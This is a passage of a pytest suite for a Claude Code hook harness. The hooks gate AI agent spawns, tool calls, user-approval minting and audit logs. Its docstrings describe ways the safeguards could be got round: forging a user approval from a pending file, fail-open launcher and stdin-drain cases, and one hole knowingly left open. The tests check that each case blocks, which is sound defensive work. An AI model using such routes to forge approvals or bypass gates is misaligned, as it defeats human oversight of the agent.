    The trigger matches BOTH import spellings — `from _kernel import fail_closed` is idiomatic
    Python and the natural choice for a gate using two or three helpers, and a substring test for
    "import _kernel" is blind to it. And the preamble must be FIRST: anything above it runs
    before the guard exists, so a gate that merely CONTAINS the preamble is not protected by it.

    Position is resolved by parsing, not by searching for a substring. Keying on the first
    `import os` was position-blind — no ordinary import line contains that substring, so a
    `import yaml` or a module-level statement placed above the preamble was skipped over and the
    check still passed. A preamble at the very bottom of a file passed too."""
    for kit in KITS:
        for path in globmodule.glob(os.path.join(TEAM_KITS, kit, "hooks", "*.py")):
            if os.path.basename(path).startswith("_"):
                continue
            with open(path, encoding="utf-8") as fh:
                body = fh.read()
            if not (USES_BRIDGE.search(body) and USES_BLOCKING.search(body)):
                continue
            statements = ast.parse(body).body
            if (statements and isinstance(statements[0], ast.Expr)
                    and isinstance(getattr(statements[0], "value", None), ast.Constant)
                    and isinstance(statements[0].value.value, str)):
                statements = statements[1:]  # module docstring may precede the preamble
            assert statements, path
            first = "\n".join(body.splitlines()[statements[0].lineno - 1:])
            assert first.startswith(_kernel.GATE_PREAMBLE.rstrip("\n")), path


@pytest.mark.parametrize("prelude", ["import yaml\n", "PATTERN = compile_something()\n",
                                     "from _kernel import run_gate\n"])
def test_the_position_check_rejects_anything_above_the_preamble(tmp_path, prelude):
    """The guarantee under test: a gate needing `json`/`re`/`yaml` at module scope, written by
    putting the preamble after the "normal" imports, fails open on exactly the missing-PyYAML and
    interrupted-kit-update cases the preamble exists to close."""
    body = prelude + _kernel.GATE_PREAMBLE
    statements = ast.parse(body).body
    first = "\n".join(body.splitlines()[statements[0].lineno - 1:])
    assert not first.startswith(_kernel.GATE_PREAMBLE.rstrip("\n"))


def test_the_position_check_accepts_a_docstring_and_shebang(tmp_path):
    body = '#!/usr/bin/env python3\n"""A gate that mentions import os in its prose."""\n' \
           + _kernel.GATE_PREAMBLE
    statements = ast.parse(body).body
    statements = statements[1:]  # docstring
    first = "\n".join(body.splitlines()[statements[0].lineno - 1:])
    assert first.startswith(_kernel.GATE_PREAMBLE.rstrip("\n"))


@pytest.mark.parametrize("spelling", ["import _kernel", "import _kernel as k",
                                      "from _kernel import fail_closed", "from _kernel import *"])
def test_the_preamble_trigger_sees_every_import_spelling(spelling):
    assert USES_BRIDGE.search(spelling + "\n")


def test_fail_closed_lets_an_allow_exit_through(tmp_path):
    """sys.exit(0) inside the guard is how every hook says "allow" — swallowing SystemExit would
    turn every passing check into a block."""
    result = run_probe(tmp_path, "with _kernel.fail_closed('probe'):\n    sys.exit(0)\n")
    assert result.returncode == 0


def test_fail_closed_lets_a_block_exit_through(tmp_path):
    result = run_probe(tmp_path,
                       "with _kernel.fail_closed('probe'):\n"
                       "    _kernel.block('probe', 'deliberate refusal')\n")
    assert result.returncode == 2
    assert "deliberate refusal" in result.stderr
    assert "internal error" not in result.stderr


def test_run_gate_allows_a_clean_pass(tmp_path):
    result = run_probe(tmp_path, "_kernel.run_gate('probe', lambda: None)\n")
    assert result.returncode == 0


def test_corrupt_state_yaml_blocks_and_names_a_restore_command(tmp_path):
    """II.12: "korruptes State-YAML -> Block mit Diagnose" and II.13: the block message names the
    concrete remedy as a runnable command. This pins the whole chain — kernel message, bridge,
    exit code — not just the kernel's wording."""
    write(str(tmp_path / "project_memory" / "product" / "active" / "PR-0001.yaml"),
          "this is a bare string, not an item mapping\n")
    result = run_probe(tmp_path,
                       "with _kernel.fail_closed('probe'):\n"
                       "    _kernel.open_state().read_item('PR-0001')\n",
                       env={"HARNESS_KERNEL_PATH": TEAM_KITS})
    assert result.returncode == 2
    assert "git restore" in result.stderr


# -- audit rotation (spec II.5 "Audit-Logs rotieren bei ~1 MB") ----------------

def test_audit_log_rotates_past_one_megabyte(tmp_path, monkeypatch):
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(tmp_path))
    log = tmp_path / "project_memory" / ".audit" / _audit.LOG_NAME
    write(str(log), "x" * (_audit.ROTATE_BYTES + 1))
    _audit.record("probe", "first record after the threshold")
    rotated = [p for p in os.listdir(str(log.parent)) if p != _audit.LOG_NAME]
    assert len(rotated) == 1
    assert log.read_text(encoding="utf-8").count("\n") == 1


def test_two_rotations_in_the_same_second_do_not_overwrite_each_other(tmp_path, monkeypatch):
    """Concurrent hooks used to compute the SAME second-resolution target; os.replace then let
    the loser rename its fresh empty log over the winner's full generation."""
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(tmp_path))
    log = tmp_path / "project_memory" / ".audit" / _audit.LOG_NAME
    for _ in range(2):
        write(str(log), "x" * (_audit.ROTATE_BYTES + 1))
        _audit.record("probe", "rotate")
    rotated = [p for p in os.listdir(str(log.parent)) if p != _audit.LOG_NAME]
    assert len(rotated) == 2
    assert all(os.path.getsize(str(log.parent / name)) > _audit.ROTATE_BYTES for name in rotated)


def test_audit_log_keeps_a_bounded_number_of_rotations(tmp_path, monkeypatch):
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(tmp_path))
    audit_dir = tmp_path / "project_memory" / ".audit"
    log = audit_dir / _audit.LOG_NAME
    for generation in range(_audit.ROTATIONS_KEPT + 3):
        stale = audit_dir / ("hook_events.%d-1-aaa.jsonl" % (1000 + generation))
        write(str(stale), "old\n")
        # explicit, increasing mtimes: created back to back, the files would otherwise share a
        # timestamp and the ordering assertion below would be luck rather than a test
        os.utime(str(stale), (1_700_000_000 + generation, 1_700_000_000 + generation))
    write(str(log), "x" * (_audit.ROTATE_BYTES + 1))
    _audit.record("probe", "rotation trims the tail")
    rotated = [p for p in os.listdir(str(audit_dir)) if p != _audit.LOG_NAME]
    assert len(rotated) == _audit.ROTATIONS_KEPT
    # the OLDEST must be the ones dropped: the sort key moved from name to mtime when the target
    # name gained a pid+nonce, and a count-only assertion passes just as happily on a pruner that
    # keeps the five oldest and deletes every new generation
    assert "hook_events.1000-1-aaa.jsonl" not in rotated
    assert "hook_events.1001-1-aaa.jsonl" not in rotated


def test_rotation_prunes_even_when_the_path_contains_glob_metacharacters(tmp_path, monkeypatch):
    """`[` and `]` are legal in Windows folder names and make an unescaped glob match nothing,
    which would silently unbound the retention."""
    repo = tmp_path / "repo [alt]"
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(repo))
    audit_dir = repo / "project_memory" / ".audit"
    for generation in range(_audit.ROTATIONS_KEPT + 3):
        write(str(audit_dir / ("hook_events.%d-1-aaa.jsonl" % (1000 + generation))), "old\n")
    write(str(audit_dir / _audit.LOG_NAME), "x" * (_audit.ROTATE_BYTES + 1))
    _audit.record("probe", "prune under a bracketed path")
    rotated = [p for p in os.listdir(str(audit_dir)) if p != _audit.LOG_NAME]
    assert len(rotated) == _audit.ROTATIONS_KEPT


def test_audit_log_below_the_threshold_is_untouched(tmp_path, monkeypatch):
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", str(tmp_path))
    log = tmp_path / "project_memory" / ".audit" / _audit.LOG_NAME
    write(str(log), "small\n")
    _audit.record("probe", "appended, not rotated")
    assert os.listdir(str(log.parent)) == [_audit.LOG_NAME]
    assert log.read_text(encoding="utf-8").startswith("small\n")


# -- gate_dispatch: the three events of the dispatch lifecycle (spec II.4) ----

sys.path.insert(0, TEAM_KITS)
from kernel import approvals, dispatch  # noqa: E402
from kernel.state import ProjectState  # noqa: E402

PR_FIELDS = {"title": "Checkout", "class": "normal", "problem": "none", "goal": "one",
             "acceptance_criteria": [{"id": "AC-1", "text": "works"}], "invariants": [],
             "out_of_scope": [], "priority": "high"}
TSK_FIELDS = {"derives_from": "PR-0001", "type": "implementation",
              "assigned_role": "backend-developer", "acceptance_refs": ["AC-1"],
              "required_inputs": [], "allowed_scope": ["src/"],
              "forbidden_scope": ["secrets/"], "expected_outputs": ["src/x.py"],
              "dependencies": []}


def mint_via_hook(state, request, launched=False):
    """Mint through the REAL PostToolUse approval hook — the only caller the kernel accepts.

    `mint` refuses every other caller (user condition (i)): it is a plain function, so anything
    that can read `approvals/pending/<id>.yaml` could otherwise pass the label it found there and
    manufacture a user approval.

    `launched=True` runs it the way the SHIPPED settings do, through `_gate.py`. Every approval
    test called the gate directly, and that gap cost a full round: the launcher left its own
    module in `sys.modules["__main__"]`, `_assert_minting_caller` saw `_gate.py` instead of
    `gate_approval.py`, and every approval in every kit silently stopped minting while the suite
    stayed green. The most valuable gate in the harness was only ever tested in a form that is
    not the one installed.
    """
    repo = os.path.dirname(state.root)
    question = approvals.build_question(request)
    payload = {
        "hook_event_name": "PostToolUse", "tool_name": "AskUserQuestion", "cwd": repo,
        "tool_input": {"questions": [question]},
        "tool_response": {"answers": {
            question["question"]: approvals.approve_label(request["mint_code"])},
            "questions": [question]},
    }
    env = dict(os.environ, CLAUDE_PROJECT_DIR=repo, HARNESS_KERNEL_PATH=TEAM_KITS)
    hooks = os.path.join(TEAM_KITS, "dev-team", "hooks")
    argv = ([sys.executable, os.path.join(hooks, "_gate.py"), "gate_approval.py"] if launched
            else [sys.executable, os.path.join(hooks, "gate_approval.py")])
    result = subprocess.run(argv, input=json.dumps(payload), capture_output=True, text=True,
                            env=env, timeout=120)
    assert result.returncode == 0 and "recorded for" in result.stderr, result.stderr


def test_an_approval_still_mints_through_the_shipped_launcher(tmp_path):
    """THE test whose absence cost a round. Every approval test called `gate_approval.py`
    directly; the SHIPPED registration runs it behind `_gate.py`. The launcher left its own module
    in `sys.modules["__main__"]`, `_assert_minting_caller` — the check that makes a hand-written
    APR worthless — saw the launcher's path instead of the gate's, and refused. On PostToolUse,
    which cannot block, so the hook still exited 0: every approval in all three kits stopped
    minting, silently, with the suite green."""
    state = ProjectState(str(tmp_path / "project_memory"))
    os.makedirs(state.root, exist_ok=True)
    pr = state.capture("PR", dict(PR_FIELDS))
    mint_via_hook(state, approvals.create_pending_request(state, "scope", pr["id"]),
                  launched=True)
    # the mint IS the approval: `DRAFT` here is exactly what the broken launcher produced
    assert state.read_item(pr["id"])["status"] == "APPROVED"
    assert globmodule.glob(
        os.path.join(state.root, "approvals", "**", "APR-*.yaml"), recursive=True)


def test_the_launcher_makes_the_gate_the_real___main__(tmp_path):
    """Setting `__name__` in a dict is not the same as being `__main__`, and the difference is
    load-bearing: anything that asks `sys.modules["__main__"]` who it is — provenance checks
    first among them — gets the launcher. Asserted directly so the next change to this file
    cannot quietly undo it."""
    hooks = tmp_path / "hooks"
    _stage_launcher(hooks)
    write(str(hooks / "gate_probe.py"),
          "import sys\n"
          "m = sys.modules['__main__']\n"
          "sys.exit(0 if getattr(m, '__file__', '').endswith('gate_probe.py') else 3)\n")
    proc = subprocess.run([sys.executable, str(hooks / "_gate.py"), "gate_probe.py"],
                          input="{}", capture_output=True, text=True)
    assert proc.returncode == 0, proc.stdout + proc.stderr


def _chain_hooks(tmp_path):
    """A hooks directory with the shipped launcher and three probes that log what they saw."""
    hooks = tmp_path / "hooks"
    _stage_launcher(hooks)
    shutil.copyfile(os.path.join(TEAM_KITS, "dev-team", "hooks", "_compat.py"),
                    str(hooks / "_compat.py"))
    for name, code in (("a", 0), ("b", 2), ("c", 0)):
        write(str(hooks / ("gate_%s.py" % name)),
              "import os, sys\n"
              "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
              "import _compat\n"
              "data = _compat.load()\n"
              "sys.stderr.write('%s saw %%r\\n' %% data.get('tool_name'))\n"
              "assert __file__.endswith('gate_%s.py') and "
              "sys.modules['__main__'].__file__ == __file__\n"
              "sys.exit(%d)\n" % (name, name, code))
    return hooks


def test_the_launcher_chain_stops_at_the_first_refusal(tmp_path):
    """WHY THERE IS A CHAIN AT ALL. Measured 2026-08-02: every PreToolUse hook of one event runs
    to completion even when a sibling exits 2, so a gate that SPENDS state (the dispatch lease)
    paid for calls another gate was refusing at the same moment. Registered as one chained
    command, a refusal ends the chain and the consuming gate never runs.

    The refusing gate's code is what the launcher must return — not "non-zero": Claude Code blocks
    on 2 alone, and any other code lets the call through."""
    hooks = _chain_hooks(tmp_path)
    proc = subprocess.run([sys.executable, str(hooks / "_gate.py"),
                           "gate_a.py", "gate_b.py", "gate_c.py"],
                          input=json.dumps({"tool_name": "Agent"}), capture_output=True, text=True)
    assert proc.returncode == 2, proc.stdout + proc.stderr
    assert "a saw 'Agent'" in proc.stderr and "b saw 'Agent'" in proc.stderr
    assert "c saw" not in proc.stderr, "the chain ran past a refusal: %s" % proc.stderr


def test_every_gate_of_a_chain_reads_the_same_payload(tmp_path):
    """stdin is a pipe and drains once. Without the raw-bytes memo in `_compat` the second gate of
    a chain would read b"" — which every gate in this repo turns into `{}`, i.e. "no tool_name",
    i.e. ALLOW. A chain that disarms its own second half is worse than no chain."""
    hooks = _chain_hooks(tmp_path)
    proc = subprocess.run([sys.executable, str(hooks / "_gate.py"), "gate_a.py", "gate_c.py"],
                          input=json.dumps({"tool_name": "Agent"}), capture_output=True, text=True)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert proc.stderr.count("saw 'Agent'") == 2, proc.stderr


def test_a_four_link_chain_hands_the_same_payload_to_its_last_gate(tmp_path):
    """The longest chain any kit registers is four (office). Two links prove the memo exists; four
    prove it is not consumed by being read — an early cut that POPPED the cache would pass the
    two-link test and hand link three an empty payload, i.e. ALLOW on every gate after the first."""
    hooks = _chain_hooks(tmp_path)
    write(str(hooks / "gate_d.py"), (hooks / "gate_a.py").read_text(encoding="utf-8")
          .replace("'a saw", "'d saw").replace("gate_a.py", "gate_d.py"))
    proc = subprocess.run([sys.executable, str(hooks / "_gate.py"),
                           "gate_a.py", "gate_c.py", "gate_d.py"],
                          input=json.dumps({"tool_name": "Agent"}), capture_output=True, text=True)
    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert proc.stderr.count("saw 'Agent'") == 3, proc.stderr


def test_a_chain_carries_a_payload_of_megabytes_to_its_last_gate(tmp_path):
    """The memo holds the WHOLE payload, not a truncated read. A tool_input carrying a large file's
    contents is ordinary (`_compat.STDIN_LIMIT` is 16 MB precisely because of that), and a memo
    filled from a short first read would hand the next gate a payload cut off mid-value — which
    parses as garbage and, through `_compat.load`'s `{}`, reads as ALLOW."""
    hooks = _chain_hooks(tmp_path)
    write(str(hooks / "gate_big.py"),
          "import hashlib, os, sys\n"
          "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
          "import _compat\n"
          "body = (_compat.load().get('tool_input') or {}).get('content') or ''\n"
          "sys.stderr.write('%d:%s\\n' % (len(body), hashlib.sha256(body.encode()).hexdigest()))\n"
          "sys.exit(0)\n")
    shutil.copyfile(str(hooks / "gate_big.py"), str(hooks / "gate_big2.py"))
    payload = json.dumps({"tool_name": "Write",
                          "tool_input": {"content": "x" * (4 * 1024 * 1024)}})
    proc = subprocess.run([sys.executable, str(hooks / "_gate.py"), "gate_big.py", "gate_big2.py"],
                          input=payload, capture_output=True, text=True, timeout=300)
    assert proc.returncode == 0, proc.stdout + proc.stderr[:2000]
    lines = [line for line in proc.stderr.splitlines() if line]
    assert len(lines) == 2 and lines[0] == lines[1], lines
    assert lines[0].startswith("%d:" % (4 * 1024 * 1024)), lines


def test_an_oversized_payload_still_stops_the_chain_at_its_first_gate(tmp_path):
    """The bound survives the memo. `_compat.load` blocks past STDIN_LIMIT because a payload it
    could not inspect must not read as permission — and the memo must not turn that into "the
    first gate already read it, so the rest is fine". The cheap way to get this wrong is to fill
    the memo before the overflow check; then gate two would decide on an over-long payload."""
    hooks = _chain_hooks(tmp_path)
    limit = 4096
    write(str(hooks / "gate_small.py"),
          "import os, sys\n"
          "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
          "import _compat\n"
          "_compat.STDIN_LIMIT = %d\n"
          "_compat.load()\n"
          "sys.stderr.write('small ran\\n')\n"
          "sys.exit(0)\n" % limit)
    write(str(hooks / "gate_after.py"),
          "import sys\nsys.stderr.write('after ran\\n')\nsys.exit(0)\n")
    payload = json.dumps({"tool_name": "Write", "tool_input": {"content": "x" * (limit * 2)}})
    proc = subprocess.run([sys.executable, str(hooks / "_gate.py"),
                           "gate_small.py", "gate_after.py"],
                          input=payload, capture_output=True, text=True, timeout=120)
    assert proc.returncode == 2, proc.stdout + proc.stderr
    assert "stdin bound" in proc.stderr, proc.stderr
    assert "after ran" not in proc.stderr, "the chain ran on past an uninspectable payload"


def test_a_gate_that_crashes_stops_the_chain_rather_than_letting_it_finish(tmp_path):
    """A gate that cannot RUN must not be read as permission (spec II.4), and in a chain that has
    a second edge: the gates BEHIND it must not run either, because the launcher has no idea what
    the broken one would have said. Both directions are measured — a crash in the middle stops the
    rest, and the exit code is 2 rather than the interpreter's 1, which Claude Code reads as ALLOW.
    """
    hooks = _chain_hooks(tmp_path)
    write(str(hooks / "gate_boom.py"), "raise MemoryError('out of room')\n")
    write(str(hooks / "gate_after.py"),
          "import sys\nsys.stderr.write('after ran\\n')\nsys.exit(0)\n")
    proc = subprocess.run([sys.executable, str(hooks / "_gate.py"),
                           "gate_a.py", "gate_boom.py", "gate_after.py"],
                          input=json.dumps({"tool_name": "Agent"}), capture_output=True, text=True)
    assert proc.returncode == 2, proc.stdout + proc.stderr
    assert "a saw 'Agent'" in proc.stderr          # the control: the chain did start
    assert "after ran" not in proc.stderr, "the chain ran on past a gate that crashed"


def test_a_gate_that_drains_stdin_itself_breaks_the_chain_fail_closed(tmp_path):
    """THE LIMIT OF THE MEMO, measured rather than implied. It is filled by `_compat.load`; a gate
    that reads `sys.stdin` directly drains the pipe without filling it, and the next gate then
    finds nothing. That is a REAL hole and it is left open on purpose — the fix would be a second
    reader of stdin in `_gate.py` with a second copy of the bound `_compat` owns.

    What makes it survivable is the DIRECTION: the next gate gets `{}`, and an integrity gate
    turns `{}` into a refusal (`_kernel.payload` blocks on an unreadable payload), so the chain
    fails closed rather than open. And what keeps it hypothetical is
    `test_no_shipped_hook_reads_stdin_raw`, which parses every shipped hook and refuses a raw
    stdin read. This test measures the direction; that one measures that nobody takes it."""
    hooks = _chain_hooks(tmp_path)
    shutil.copyfile(os.path.join(TEAM_KITS, "dev-team", "hooks", "_kernel.py"),
                    str(hooks / "_kernel.py"))
    for name in ("_root.py", "_audit.py"):
        shutil.copyfile(os.path.join(TEAM_KITS, "dev-team", "hooks", name), str(hooks / name))
    write(str(hooks / "gate_raw.py"),
          "import sys\nsys.stdin.buffer.read()\nsys.stderr.write('raw drained\\n')\n"
          "sys.exit(0)\n")
    write(str(hooks / "gate_needs.py"),
          "import os, sys\n"
          "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
          "import _kernel\n"
          "_kernel.payload('gate_needs')\n"
          "sys.stderr.write('needs ran\\n')\n"
          "sys.exit(0)\n")
    proc = subprocess.run([sys.executable, str(hooks / "_gate.py"),
                           "gate_raw.py", "gate_needs.py"],
                          input=json.dumps({"tool_name": "Agent"}), capture_output=True, text=True)
    assert "raw drained" in proc.stderr, proc.stderr
    assert proc.returncode == 2, proc.stdout + proc.stderr
    assert "could not be read or parsed" in proc.stderr, proc.stderr


def dispatched_repo(tmp_path, **task_overrides):
    """A repo with an approved PR and one leased task — the state a real spawn happens in.

    THE ORIGIN IS THE PR THIS CALL JUST CAPTURED, not the `PR-0001` of `TSK_FIELDS`: a second call
    against the same repo captures `PR-0002`, and since the kernel resolves an origin against its
    root transitively and refuses one that hangs from another root (TSK-0106), a task claiming
    `PR-0002` as its requirement and `PR-0001` as its origin is refused at creation. That refusal
    is right — the dispatch gate would judge the task against the other root's criteria — so the
    fixture is what had to move.
    """
    state = ProjectState(str(tmp_path / "project_memory"))
    os.makedirs(state.root, exist_ok=True)
    pr = state.capture("PR", dict(PR_FIELDS))
    mint_via_hook(state, approvals.create_pending_request(state, "scope", pr["id"]))
    fields = dict(TSK_FIELDS, product_requirement=pr["id"], derives_from=pr["id"])
    fields.update(task_overrides)               # a caller that wants another origin still gets it
    task = dispatch.create_task(state, fields)
    state.transition(task["id"], "READY")
    satisfy_the_architect_step(state, state.read_item(task["id"]),
                               state.read_item(pr["id"]))
    lease = dispatch.create_lease(state, task["id"])
    return state, task, dispatch.dispatch_header(lease)


def run_dispatch(tmp_path, payload, kit="dev-team"):
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path), HARNESS_KERNEL_PATH=TEAM_KITS)
    return subprocess.run([sys.executable, os.path.join(TEAM_KITS, kit, "hooks",
                                                        "gate_dispatch.py")],
                          input=json.dumps(payload), capture_output=True, text=True,
                          env=env, timeout=120)


def spawn_payload(tmp_path, header, role="backend-developer", event="PreToolUse", **extra):
    payload = {"hook_event_name": event, "tool_name": "Agent", "cwd": str(tmp_path),
               "tool_input": {"subagent_type": role,
                              "prompt": "objective: do it\n%s\noutput: a result" % header}}
    payload.update(extra)
    return payload


def test_dispatch_gate_allows_a_valid_spawn(tmp_path):
    state, task, header = dispatched_repo(tmp_path)
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    assert result.returncode == 0, result.stderr
    lease = state._read_yaml(os.path.join(state.root, "tasks", "leases",
                                          task["id"] + ".lease.yaml"))
    assert lease.get("awaiting_bind_until")  # the child may now claim it


def amended_repo(tmp_path, approve_the_amendment=True):
    """A repo whose root carries an amendment minting AC-11 -- the pilot-3 shape (BUG-0040).

    The amendment's approval is MINTED through the real approval hook, like every other approval
    in this file: a hand-written `status: APPROVED` would let the criteria check pass on a state
    no user ever signed, which is the very thing the derivation under test is built to require.
    """
    state = ProjectState(str(tmp_path / "project_memory"))
    os.makedirs(state.root, exist_ok=True)
    pr = state.capture("PR", dict(PR_FIELDS))
    mint_via_hook(state, approvals.create_pending_request(state, "scope", pr["id"]))
    cr = state.capture("CR", {"title": "loyalty discount", "target_pr": pr["id"],
                              "target_revision": 1, "change_description": "a discount line",
                              "acceptance_criteria": [{"id": "AC-11", "text": "discount"}]})
    if approve_the_amendment:
        mint_via_hook(state, approvals.create_pending_request(state, "scope", cr["id"]))
    task = dispatch.create_task(state, dict(TSK_FIELDS, product_requirement=pr["id"],
                                            acceptance_refs=["AC-11"]))
    state.transition(task["id"], "READY")
    satisfy_the_architect_step(state, state.read_item(task["id"]),
                               state.read_item(pr["id"]))
    return state, cr, dispatch.dispatch_header(dispatch.create_lease(state, task["id"]))


def test_the_shipped_gate_authorises_a_spawn_against_an_approved_amendments_criterion(tmp_path):
    """BUG-0040 through the PROCESS the provider starts, not through a library call.

    Pilot 3 measured the refusal at exactly this layer (audit log 21:54:37, `gate_dispatch` block),
    so the fix has to be measured there too -- the kernel derivation is only reachable from a spawn
    because this hook calls `validate_dispatch`, and a test that stopped at the kernel would not
    say whether the shipped hook still gets there.
    """
    state, _cr, header = amended_repo(tmp_path)
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    assert result.returncode == 0, result.stderr


def test_the_shipped_gate_still_refuses_an_unapproved_amendments_criterion(tmp_path):
    """The counter-direction at the same layer: a DRAFT amendment authorises nothing, and the
    refusal that reaches the operator names the item and the reason -- the criterion is plainly
    readable in `CR-0001.yaml`, so a bare "exists nowhere" is the pilot's confusion again."""
    state, cr, header = amended_repo(tmp_path, approve_the_amendment=False)
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    assert result.returncode == 2
    assert "AC-11" in result.stderr and cr["id"] in result.stderr, result.stderr


AUDIT_TSK_FIELDS = dict(TSK_FIELDS, type="review", assigned_role="project-auditor",
                        allowed_scope=[], forbidden_scope=[], expected_outputs=["findings"])


def routine_dispatched_repo(tmp_path):
    """A repo whose ONLY approval is a routine one, with the audit task leased under it.

    The root gets no scope and no delivery approval at all, so nothing but the routine route can
    produce this lease -- which is what makes the spawn below a measurement of that route rather
    than of the one beside it.
    """
    state = ProjectState(str(tmp_path / "project_memory"))
    os.makedirs(state.root, exist_ok=True)
    pr = state.capture("PR", dict(PR_FIELDS))
    mint_via_hook(state, approvals.create_pending_request(
        state, "routine", pr["id"],
        manifest={"role": "project-auditor", "scope": ["project_memory/**"],
                  "trigger": "weekly + after kit update", "cadence": "weekly"},
        approval_expires=time.time() + 3600))
    task = dispatch.create_task(state, dict(AUDIT_TSK_FIELDS, product_requirement=pr["id"],
                                            derives_from=pr["id"]))
    state.transition(task["id"], "READY")
    satisfy_the_architect_step(state, state.read_item(task["id"]),
                               state.read_item(pr["id"]))
    lease = dispatch.create_lease(state, task["id"])
    apr_id = state.read_item(pr["id"])["approval_ref"]
    return state, task, dispatch.dispatch_header(lease), apr_id


def test_the_audit_spawn_runs_on_a_routine_approval(tmp_path):
    """Spec II.1 gives the auditor a routine approval as its legitimation; this is that spawn,
    through the shipped PreToolUse gate process.

    Measured 2026-07-31 before the kernel had the route: the lease could not even be created
    ("neither PR-0001 nor an analysis approval authorises dispatching TSK-0001"), so the auditor
    the constitution calls MANDATORY could only be spawned by re-listing every single run in an
    `analysis` manifest.
    """
    state, task, header, _apr = routine_dispatched_repo(tmp_path)
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, header, role="project-auditor"))
    assert result.returncode == 0, result.stderr
    lease = state._read_yaml(os.path.join(state.root, "tasks", "leases",
                                          task["id"] + ".lease.yaml"))
    assert lease.get("awaiting_bind_until")


def test_revoking_the_routine_approval_stops_the_audit_spawn(tmp_path):
    """II.10a: "Abgelaufene oder widerrufene Routinefreigabe blockiert den Audit-Dispatch
    (fail-closed)". The lease already exists and its nonce is still good, so the only thing that
    can refuse here is the approval being re-read at SPAWN time -- which is the whole reason
    `validate_dispatch` re-runs the authorisation instead of trusting the lease."""
    _state, _task, header, apr_id = routine_dispatched_repo(tmp_path)
    state = ProjectState(str(tmp_path / "project_memory"))
    approvals.revoke(state, apr_id)
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, header, role="project-auditor"))
    assert result.returncode == 2, result.stdout + result.stderr
    assert "revoked" in result.stderr.lower(), result.stderr


def test_dispatch_gate_refuses_a_spawn_without_a_header(tmp_path):
    """II.12: "Spawn ohne Header -> Block" and "freie Prosa mit zufaelliger TSK-ID -> Block".
    Prose is never evidence — that is the V1 keyword check this replaces."""
    dispatched_repo(tmp_path)
    payload = spawn_payload(tmp_path, "I am working on TSK-0001, honestly")
    assert run_dispatch(tmp_path, payload).returncode == 2


def test_dispatch_gate_refuses_a_role_mismatch(tmp_path):
    _state, _task, header = dispatched_repo(tmp_path)
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, header, role="frontend-developer"))
    assert result.returncode == 2
    assert "role mismatch" in result.stderr


def test_dispatch_gate_ignores_tools_that_are_not_spawns(tmp_path):
    dispatched_repo(tmp_path)
    payload = {"hook_event_name": "PreToolUse", "tool_name": "Write", "cwd": str(tmp_path),
               "tool_input": {"file_path": "a.txt"}}
    assert run_dispatch(tmp_path, payload).returncode == 0


def test_dispatch_gate_refuses_when_there_is_no_state(tmp_path):
    """The V1 bootstrap hole, closed: an empty store let every spawn through."""
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, "HARNESS_DISPATCH {}"))
    assert result.returncode == 2
    assert "no canonical project state" in result.stderr


def test_dispatch_gate_stands_down_during_an_explicit_bootstrap(tmp_path):
    import time as timemodule
    write(str(tmp_path / ".claude" / "kit_state.json"),
          json.dumps({"bootstrap": {"expires_at_epoch": timemodule.time() + 600,
                                    "user_confirmed": True, "installer_run": "scaffold-1"}}))
    assert run_dispatch(tmp_path, spawn_payload(tmp_path, "x")).returncode == 0


def test_subagent_start_binds_the_pending_dispatch(tmp_path):
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    payload = {"hook_event_name": "SubagentStart", "cwd": str(tmp_path),
               "agent_id": "child-1", "agent_type": "backend-developer"}
    assert run_dispatch(tmp_path, payload).returncode == 0
    assert dispatch.task_for_agent(state, "child-1")["id"] == task["id"]


def test_subagent_start_without_a_pending_dispatch_leaves_it_unbound(tmp_path):
    """Not a block: SubagentStart fires for every subagent, and gate layers 1+2 already refused
    the ones that had no business starting. Unbound is what gate layer 3 then refuses on."""
    state, _task, _header = dispatched_repo(tmp_path)
    payload = {"hook_event_name": "SubagentStart", "cwd": str(tmp_path),
               "agent_id": "stranger", "agent_type": "backend-developer"}
    assert run_dispatch(tmp_path, payload).returncode == 0
    assert dispatch.task_for_agent(state, "stranger") is None


def test_two_same_role_dispatches_leave_the_child_unbound(tmp_path):
    """The platform limit made visible rather than guessed around — and reported HONESTLY:
    SubagentStart cannot block (hooks reference: "Shows stderr to user only"), so the child does
    start. What protects the scope is that it starts UNBOUND."""
    state, _task, header = dispatched_repo(tmp_path)
    second = dispatch.create_task(state, dict(TSK_FIELDS, product_requirement="PR-0001",
                                             allowed_scope=["services/"],
                                             expected_outputs=["services/x.py"]))
    state.transition(second["id"], "READY")
    satisfy_the_architect_step(state, state.read_item(second["id"]),
                               state.read_item("PR-0001"))
    second_lease = dispatch.create_lease(state, second["id"])
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    run_dispatch(tmp_path, spawn_payload(tmp_path, dispatch.dispatch_header(second_lease)))
    payload = {"hook_event_name": "SubagentStart", "cwd": str(tmp_path),
               "agent_id": "child-1", "agent_type": "backend-developer"}
    result = run_dispatch(tmp_path, payload)
    assert result.returncode == 0
    assert "NOT bound" in result.stderr
    assert "sequentially" in result.stderr
    assert dispatch.task_for_agent(state, "child-1") is None


@pytest.mark.parametrize("status", ["completed", "async_launched"])
def test_post_tool_use_moves_a_started_spawn_to_in_progress(tmp_path, status):
    """"Started", not "finished". `run_in_background: true` — the platform's own default, which a
    real run hit 37/37 times by omission — reports `async_launched` at spawn time. Treating that
    as a failure freed the task while the child was still running, leaving it unbound (all writes
    refused) and immediately re-leasable."""
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    payload = spawn_payload(tmp_path, header, event="PostToolUse",
                            tool_response={"status": status, "agentId": "child-9"})
